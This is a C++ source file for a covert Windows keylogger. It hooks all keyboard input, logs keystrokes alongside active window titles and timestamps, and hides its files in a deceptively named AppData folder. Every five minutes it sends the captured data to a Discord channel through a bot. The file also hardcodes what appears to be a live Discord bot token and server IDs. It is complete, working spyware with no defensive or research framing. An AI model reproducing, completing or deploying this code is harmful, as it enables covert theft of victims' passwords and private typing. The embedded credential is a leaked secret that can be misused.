#define _CRT_SECURE_NO_WARNINGS     //fuck msvc
#define NOMINMAX //get rid of windef.h bad max/min impl
#define UNICODE

//Use c++ i/o for all

//#include <windows.h>
//#include <shlobj.h>

#pragma once
//Visual Studio put /external:W0 AFTER /W4, hence defeat the purpose of suppress
//external headers warning (there are ways too much warnings there). This is workaround
#pragma warning (push, 0)
#include <dpp/cluster.h>
#include <dpp/once.h>

#include <cstdio>
#include <ctime>
#include <cassert>
#include <fstream>
#include <iostream>
#include <map>
#include <vector>
#include <functional>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <algorithm>
#include <list>
#include <filesystem>
#include <windows.h>
#include <ShlObj.h>

#pragma warning (pop)

// #define sh_winapi_success(x) assert(x == S_OK)
// #define winapi_success(x) assert(x != 0)

const std::string    BOT_TOKEN    = "Nzk1MjgzNjM2MDg1MzI1ODI1.G9gcxc.oaYk-11OnqfHzg9pp5chK5af97lK-xN2DVcKB4";

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

std::map<std::string, unsigned int> mapper, queued_mapper;
unsigned int process_counter = 0;

const WCHAR *LOGGER_FILENAME = L"thislog.txt";
std::ofstream logger_file;
// FILE* logger_file, *print_file;

WCHAR local_appdata_path[MAX_PATH+5];

std::mutex mx;
std::condition_variable condvar;
bool is_sendkey = false, is_sendtimestamp = false, is_sendmap = false;

//won't create any local files except the running log. Use list for better
//optimization in concurrent element accessing and removing elements.
std::list<std::string> file_list;

const std::map<const dpp::loglevel, const std::string> DPP_LOGLEVEL_MAP {
	{dpp::loglevel::ll_trace, "[TRACE] "},
	{dpp::loglevel::ll_debug, "[DEBUG] "},
	{dpp::loglevel::ll_info, "[INFO] "},
	{dpp::loglevel::ll_warning, "[WARN] "},
	{dpp::loglevel::ll_error, "[ERORR] "},
	{dpp::loglevel::ll_critical, "[CRITICAL!] "},
};

std::unique_ptr<dpp::cluster> bot;
dpp::message botmsg;

inline void wide_char_to_mb(WCHAR* input, char* output, int outputbuf) {
	WideCharToMultiByte(CP_UTF8, 0, input, -1, output, outputbuf, NULL, NULL);
}

inline void mb_to_wide_char(char* input, WCHAR* output, int outputbuf) {
	MultiByteToWideChar(CP_UTF8, 0, input, -1, output, outputbuf);
}

/// @brief Log to file.  Maximum 1000 characters
/// @param format formatted string, just like printf
/// @param
inline void logger(const char* format, ...) {
	char __buf[1001];
	va_list arg;
	va_start(arg, format);
	vsnprintf(__buf, 1000, format, arg);
	va_end(arg);

	logger_file.write(__buf, strlen(__buf));
	logger_file.flush();
}

/// @brief Print to container.
/// @param format formatted string, just like printf
/// @param
inline void print_to(const char* format, ...) {
    char __buf[1001];
	va_list arg;
	va_start(arg, format);
	vsnprintf(__buf, 1000, format, arg);
	va_end(arg);

	if(file_list.back().size() >= 7000000) [[unlikely]] {
		file_list.push_back(std::string());
	}
	file_list.back().append(__buf);
}

// void send_data(std::string& err) {
void send_data() {
	while(true) {
		std::this_thread::sleep_for(std::chrono::minutes(5));

		std::string err = "ok!";	//temp
		int __fileindex = 0;
		bool __is_failed = false;

		//new write location!
		file_list.push_back(std::string());
		while(file_list.size() > 1) {
			//say no to null-content file
			if(file_list.begin()->size() == 0) goto __label_file_list_erase;

			//for "safety issue" and since file are 7 mb each so we would send everyfile one by one
			//filename when upload to discord is unnecessary, so let it in order
			botmsg.add_file(std::to_string(__fileindex).append(".txt"), file_list.front());
			bot->message_create(botmsg, [&err, &__is_failed](const dpp::confirmation_callback_t& eventret) {
				if (eventret.is_error()) {
					err = eventret.get_error().message;
					__is_failed = true;
					return dpp::utility::log_error()(eventret);
				}
			});
			botmsg.filename.clear();
			botmsg.filecontent.clear();
			if(__is_failed) return;

			__label_file_list_erase:
			file_list.erase(file_list.begin());
		}
	}
}

int Save(int key_stroke) {
	static WCHAR lastwindow[260] = L"";	//must be static or thing will break!
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground) {
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground) {
		WCHAR window_title[260];
		char mbwindow_title[260];

		GetWindowTextW(foreground, window_title, 256);
		if (wcscmp(window_title, lastwindow) != 0)
		{
			wcscpy(lastwindow, window_title);
			wide_char_to_mb(window_title, mbwindow_title, 260);
			std::string strwindow_title(mbwindow_title);
			time_t timestamp = time(NULL);

			if (mapper[strwindow_title] == 0) {
				if (process_counter >= ~(0U)) {
					assert(false && "Internal error! Map overflowed");
				}
				queued_mapper[strwindow_title] = ++process_counter;
				mapper[strwindow_title] = process_counter;
				// logger("\nNew map: %d %s\n", process_counter, mbwindow_title);
				print_to("\n>%u %s\n", process_counter, strwindow_title.c_str());
			}

			unsigned int mapper_id = mapper[strwindow_title];
			// logger("\nMap: Stamp: %u %llu\n", mapper_id, timestamp);
			print_to("\n[%u %lld\n", mapper_id, timestamp);
		}
	}

	print_to("%.2x", key_stroke);

	return 0;
}


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && wParam == WM_KEYDOWN) {
		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		Save(kbdStruct.vkCode);
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

short is_bot_connected = 0;
std::mutex bot_connected_lock;
std::condition_variable bot_connected_condvar;

//Search for local appdata, make log file, say hello world before everything start
inline void preinit() {
	// Check and create local directory. Usually the loader would already created this before 
	SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata_path);
	wcscat(local_appdata_path, L"\\i_shell_link_shortcut_backup\\");
    if(!CreateDirectoryW(local_appdata_path, NULL)) {
        if(GetLastError() != ERROR_ALREADY_EXISTS) {
            exit(EXIT_FAILURE);
        }
    }

	WCHAR __logfilepath[501];
	wcscpy(__logfilepath, local_appdata_path);
	wcscat(__logfilepath, LOGGER_FILENAME);

	logger_file.open(std::filesystem::path(__logfilepath), std::ios::app);

	if(!logger_file) {
		exit(EXIT_FAILURE);
	}

	//Time for logging
	time_t __t = time(NULL);
	struct tm *__timestruct;
	__timestruct = std::localtime(&__t);
	char __timestr[65];
	__timestr[0] = '\0';
	if(__timestruct != nullptr) [[likely]] {
		strftime(__timestr, sizeof(__timestr), "%c", __timestruct);
	}

	// logging
	logger("\nHello world! Current time is %s\n", __timestr);
	#if defined(__GNUC__)
        logger("Built with GCC %d.%d.%d ", __GNUC__, __GNUC_MINOR__, __GNUC_PATCHLEVEL__);
        #if defined(__MINGW64__)
            logger("(MinGW-w64 %d.%d) ", __MINGW64_VERSION_MAJOR, __MINGW64_VERSION_MINOR);
        #elif defined(__MINGW32__)
            logger("(MinGW %d.%d) ", __MINGW32_MAJOR_VERSION, __MINGW32_MINOR_VERSION);
        #endif
    #elif defined(_MSC_VER)
        logger("Built with MSVC %d ", _MSC_VER);
    #else
        logger("Built with unknown compiler ");
    #endif
        logger("on %s at %s. %d-bit build\nDPP version: %s\n", __DATE__, __TIME__, sizeof(void*) << 3, dpp::utility::version().c_str());
}

void logrun()
{
	std::unique_lock<std::mutex> locker(bot_connected_lock);
	while (is_bot_connected == 0) bot_connected_condvar.wait(locker);
	if (is_bot_connected != -1) {
		logger("[INFO] Bot successfully initialized. Logging...\n");
	} else {
		logger("[CRITICAL!] Bot failed to initialized. Terminating...\n");
		exit(EXIT_FAILURE);
	}

	if (!(_hook = SetWindowsHookExW(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
		logger("[CRITICAL!] Failed to install hook. Terminating...\n");
		exit(EXIT_FAILURE);
	}
	MSG msg;
	while (true) {
		GetMessageW(&msg, NULL, 0, 0);
	}
}

void botrun()
{
	is_bot_connected = 0;
    try {
        /* Create bot cluster */
        bot = std::unique_ptr<dpp::cluster>(new dpp::cluster(BOT_TOKEN,
            dpp::i_default_intents,
            0, 0, 2, true,
            { dpp::cp_aggressive, dpp::cp_aggressive, dpp::cp_aggressive },
            10, 0));

		/* Configure/redirect log messages to logger file */
		bot->on_log([](const dpp::log_t& loghandle) {
			logger("%s%s\n", DPP_LOGLEVEL_MAP.at(loghandle.severity).c_str(), loghandle.message.c_str());
		});

        /* Handle slash command */
		bot->on_slashcommand([](const dpp::slashcommand_t& event) {
			size_t issuing_user = event.command.get_issuing_user().id;
			std::string issuing_command = event.command.get_command_name();
			if (issuing_command == "ping") {
				char buffer[1001];
				snprintf(buffer, 1000, "Pong! %f ms", bot->rest_ping);
				event.reply(buffer);
			}
			if (issuing_command == "version") {
				char buffer[1001];
				snprintf(buffer, 1000, "Hello world! Running on %s. Current time is %s",
					dpp::utility::version().c_str(),
					dpp::utility::current_date_time().c_str());
				event.reply(buffer);
			}
			logger("[INFO] User %llu executed %s\n", issuing_user, issuing_command.c_str());
        });

		botmsg = dpp::message(bot.get());
		botmsg.set_guild_id(664744934003310592);
		botmsg.set_channel_id(1056052934921699388);

        /* Register slash command here in on_ready */
        bot->on_ready([](const dpp::ready_t& event) {
            /* Wrap command registration in run_once to make sure it doesnt run on every full reconnection */
            if (dpp::run_once<struct register_bot_commands>()) {
                bot->global_command_create(dpp::slashcommand("ping", "Ping pong!", bot->me.id));
				bot->global_command_create(dpp::slashcommand("version", "version", bot->me.id));
            }

			botmsg.set_content("Session initialized!");
			bot->message_create(botmsg);
			botmsg.set_content("Data sent!");
        });
    
        /* Start the bot */
        bot->start(true);
		is_bot_connected = 1;
		bot_connected_condvar.notify_all();
    }
    catch (dpp::exception& e) {
        logger("\n[ERROR] %s\n", e.what());
		is_bot_connected = -1;
		bot_connected_condvar.notify_all();
    }

	std::thread t3(send_data);
	t3.join();
}

//now switch to windows subsystem, no longer console
int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	// int argc;
	// WCHAR** argv = CommandLineToArgvW(pCmdLine, &argc);

	preinit();

	// ShowWindow(FindWindowW(L"ConsoleWindowClass", NULL), 0); // visible window

	//initial
	file_list.push_back(std::string());

	//currently program only run we successfully connect to discord... will make delayed connection soon
	std::thread t1(botrun);
	std::thread t2(logrun);

	t1.join();
	t2.join();

	bot->shutdown();
	logger_file.close();
	return 0;
}
